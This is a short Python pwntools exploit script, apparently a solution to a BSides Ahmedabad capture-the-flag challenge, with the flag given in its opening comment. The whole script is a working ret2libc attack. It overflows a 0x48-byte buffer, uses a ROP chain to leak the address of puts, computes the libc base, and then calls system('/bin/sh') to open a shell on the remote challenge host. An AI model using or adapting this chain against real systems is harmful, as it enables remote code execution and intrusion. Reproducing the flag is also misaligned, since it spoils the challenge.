# Neko{Th4t's_4_n1c3_f33db4ck}
from pwn import *

elf = ELF("./vuln")
libc = elf.libc

target = process([elf.path])
target = remote("pwn2.bsidesahmedabad.in", 9001)

def sla(s, d):
	target.sendlineafter(s, str(d))

pop_rdi = p64(0x0000000000401273)
ret = p64(0x0000000000401274)

sla(":", "A"*0x48 + pop_rdi + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main']))
target.recvuntil("Thank you!\n")

libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['puts']
sla(":", "A"*0x48 + ret + pop_rdi + p64(libc_base + libc.search("/bin/sh\x00").next()) + p64(libc_base + libc.sym['system']))

target.interactive()
